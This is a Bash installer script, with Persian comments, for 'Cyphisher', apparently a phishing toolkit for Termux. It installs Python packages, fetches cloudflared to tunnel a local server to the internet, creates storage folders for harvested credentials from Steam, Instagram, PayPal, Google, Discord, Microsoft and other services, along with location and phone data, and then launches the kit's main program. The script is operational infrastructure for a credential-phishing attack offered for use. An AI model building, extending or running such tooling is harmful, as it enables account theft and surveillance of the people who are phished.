#!/usr/bin/env bash
set -euo pipefail

# ===============================
# Cyphisher Setup Script - Termux Fixed Version
# ===============================

AUTO_CF="${AUTO_CF:-1}"
PORT="${PORT:-5001}"

APP_FILE="main.py"
VENV_DIR="venv"
CF_DIR="cloud_flare"

log(){ printf "\n[setup] %s\n" "$*"; }
error(){ printf "\n[ERROR] %s\n" "$*" >&2; }

# پاکسازی کامل cloudflared قبلی
cleanup_old_cloudflared() {
    log "🧹 Cleaning up previous cloudflared installations..."
    
    # حذف تمام فایل‌های cloudflared
    rm -f "${CF_DIR}/cloudflared" 2>/dev/null || true
    rm -f "${CF_DIR}/cloudflared.exe" 2>/dev/null || true
    rm -f "cloudflared" 2>/dev/null || true
    rm -f "cloudflared.exe" 2>/dev/null || true
    
    # حذف فایل‌های log
    rm -f "cloudflared.log" "cloudflared_url.txt" "app.pid" "cf.pid" 2>/dev/null || true
    
    log "✅ Cleanup completed"
}

# تشخیص پلتفرم
detect_platform() {
    OS="$(uname -s | tr '[:upper:]' '[:lower:]')"
    ARCH="$(uname -m | tr '[:upper:]' '[:lower:]')"

    # تشخیص Termux
    IS_TERMUX=0
    if [ -n "${PREFIX-}" ] && echo "${PREFIX}" | grep -q "com.termux"; then
        IS_TERMUX=1
        OS="linux"
        if [ "$ARCH" = "aarch64" ]; then
            ARCH="arm64"
        elif [ "$ARCH" = "armv7l" ] || [ "$ARCH" = "arm" ]; then
            ARCH="arm"
        else
            ARCH="arm64"
        fi
    fi

    # تشخیص ویندوز
    if [[ "$OS" == *"mingw"* ]] || [[ "$OS" == *"cygwin"* ]] || [[ "$OS" == *"msys"* ]]; then
        OS="windows"
    fi

    log "🔧 Platform: OS=$OS ARCH=$ARCH TERMUX=$IS_TERMUX"
}

# نصب پایتون و ابزارهای لازم
install_dependencies() {
    log "📦 Installing dependencies..."
    
    if [ "$IS_TERMUX" -eq 1 ]; then
        pkg update -y
        pkg install -y python git curl wget -y
    else
        log "Please install Python and Git manually for your system"
        return 1
    fi
}

# ایجاد محیط مجازی پایتون
setup_python_env() {
    log "🐍 Setting up Python environment..."
    
    if [ ! -d "$VENV_DIR" ]; then
        python -m venv "$VENV_DIR"
    fi
    
    # فعال‌سازی محیط مجازی
    if [ -f "${VENV_DIR}/bin/activate" ]; then
        source "${VENV_DIR}/bin/activate"
    else
        error "Could not activate virtual environment"
        return 1
    fi
    
    # نصب requirements
    pip install --upgrade pip
    if [ -f "requirements.txt" ]; then
        pip install -r requirements.txt
    else
        pip install rich pyfiglet requests flask
    fi
    
    log "✅ Python environment ready"
}

# دانلود تضمینی cloudflared برای ترمکس
download_cloudflared_guaranteed() {
    log "🌐 Downloading cloudflared for Termux (Linux ARM64)..."
    
    mkdir -p "$CF_DIR"
    
    # URL مستقیم برای دانلود
    URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
    OUTPUT_FILE="${CF_DIR}/cloudflared"
    
    log "📥 Download URL: $URL"
    log "💾 Output: $OUTPUT_FILE"
    
    # حذف فایل قبلی اگر وجود دارد
    rm -f "$OUTPUT_FILE" 2>/dev/null || true
    
    # دانلود با curl
    if command -v curl >/dev/null 2>&1; then
        log "🔻 Using curl for download..."
        if curl -L --progress-bar -o "$OUTPUT_FILE" "$URL"; then
            log "✅ Download completed with curl"
        else
            error "❌ curl download failed"
            return 1
        fi
    # دانلود با wget
    elif command -v wget >/dev/null 2>&1; then
        log "🔻 Using wget for download..."
        if wget -O "$OUTPUT_FILE" "$URL"; then
            log "✅ Download completed with wget"
        else
            error "❌ wget download failed"
            return 1
        fi
    else
        error "❌ Neither curl nor wget available"
        return 1
    fi
    
    # بررسی اینکه فایل دانلود شده است
    if [ ! -f "$OUTPUT_FILE" ]; then
        error "❌ Downloaded file not found!"
        return 1
    fi
    
    # بررسی سایز فایل (نباید خالی باشد)
    FILE_SIZE=$(stat -c%s "$OUTPUT_FILE" 2>/dev/null || stat -f%z "$OUTPUT_FILE" 2>/dev/null || echo "0")
    if [ "$FILE_SIZE" -lt 1000000 ]; then  # کمتر از 1MB احتمالاً خطا دارد
        error "❌ Downloaded file seems too small ($FILE_SIZE bytes)"
        return 1
    fi
    
    log "📊 File size: $FILE_SIZE bytes"
    
    # دادن مجوز اجرا
    log "🔐 Setting execute permissions..."
    if chmod +x "$OUTPUT_FILE"; then
        log "✅ Execute permissions set"
    else
        error "❌ Failed to set execute permissions"
        return 1
    fi
    
    # تست نهایی
    if [ -x "$OUTPUT_FILE" ]; then
        log "✅ File is executable"
        
        # تست نسخه
        if "$OUTPUT_FILE" version >/dev/null 2>&1; then
            log "✅ cloudflared test successful"
            echo "$OUTPUT_FILE"
            return 0
        else
            log "⚠️ cloudflared version test failed, but file exists"
            echo "$OUTPUT_FILE"
            return 0
        fi
    else
        error "❌ File is not executable after permission change"
        return 1
    fi
}

# بررسی نهایی cloudflared
verify_cloudflared() {
    log "🔍 Verifying cloudflared installation..."
    
    local cf_path="${CF_DIR}/cloudflared"
    
    if [ ! -f "$cf_path" ]; then
        error "❌ cloudflared not found at $cf_path"
        return 1
    fi
    
    if [ ! -x "$cf_path" ]; then
        log "⚠️ cloudflared not executable, fixing..."
        chmod +x "$cf_path" || {
            error "❌ Failed to make cloudflared executable"
            return 1
        }
    fi
    
    # تست اجرا
    if "$cf_path" version >/dev/null 2>&1; then
        log "✅ cloudflared verified and working"
        return 0
    else
        log "⚠️ cloudflared exists but version check failed"
        return 0  # باز هم ادامه می‌دهیم چون ممکن است کار کند
    fi
}

# ایجاد دایرکتوری‌ها
create_directories() {
    log "📁 Creating directories..."
    
    dirs=(
        "steam_Credentials" "insta_Credentials" "location_information" "uploads"
        "IG_FOLLOWER" "Facebook" "Github" "Google" "WordPress" "Django" "Netflix"
        "Discord" "Paypal" "Twitter" "Yahoo" "yandex" "snapchat" "Roblox"
        "adobe" "LinkedIN" "Gitlab" "Ebay" "Dropbox" "chatgpt" "Deepseek"
        "collected_data" "phone_data" "Twitch" "Microsoft"
    )
    
    for dir in "${dirs[@]}"; do
        mkdir -p "$dir"
    done
    
    log "✅ Directories created"
}

# تابع اصلی
main() {
    log "🚀 Starting Cyphisher Setup for Termux..."
    
    # مرحله 1: تشخیص پلتفرم
    detect_platform
    
    # فقط برای ترمکس ادامه بده
    if [ "$IS_TERMUX" -ne 1 ]; then
        error "This script is optimized for Termux only"
        exit 1
    fi
    
    # مرحله 2: پاکسازی کامل
    cleanup_old_cloudflared
    
    # مرحله 3: نصب وابستگی‌ها
    install_dependencies
    
    # مرحله 4: محیط پایتون
    setup_python_env
    
    # مرحله 5: دانلود cloudflared (تضمینی)
    log "⬇️ Downloading cloudflared (this may take a moment)..."
    if download_cloudflared_guaranteed; then
        log "🎉 cloudflared downloaded successfully!"
    else
        error "❌ Cloudflared download failed!"
        log "⚠️ Continuing without cloudflared support..."
    fi
    
    # مرحله 6: تأیید نصب cloudflared
    verify_cloudflared
    
    # مرحله 7: ایجاد دایرکتوری‌ها
    create_directories
    
    # خلاصه نصب
    log "==========================================="
    log "🎊 SETUP COMPLETED SUCCESSFULLY!"
    log "==========================================="
    log "Platform: Termux ($ARCH)"
    log "Python: $(python --version 2>/dev/null || echo 'Unknown')"
    log "Virtual Environment: $VENV_DIR"
    log "Port: $PORT"
    
    if [ -f "${CF_DIR}/cloudflared" ] && [ -x "${CF_DIR}/cloudflared" ]; then
        log "Cloudflared: ✅ INSTALLED AND READY"
        log "Location: ${CF_DIR}/cloudflared"
    else
        log "Cloudflared: ❌ NOT AVAILABLE"
        log "Tunnel features will not work"
    fi
    
    log "🚀 Starting application in 5 seconds..."
    sleep 5
    
    # اجرای برنامه اصلی
    if [ -f "${VENV_DIR}/bin/python" ]; then
        PYTHON_BIN="${VENV_DIR}/bin/python"
        clear
        log "🏁 Launching Cyphisher..."
        exec "$PYTHON_BIN" "$APP_FILE"
    else
        error "Python binary not found"
        exit 1
    fi
}

# اجرای اسکریپت
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
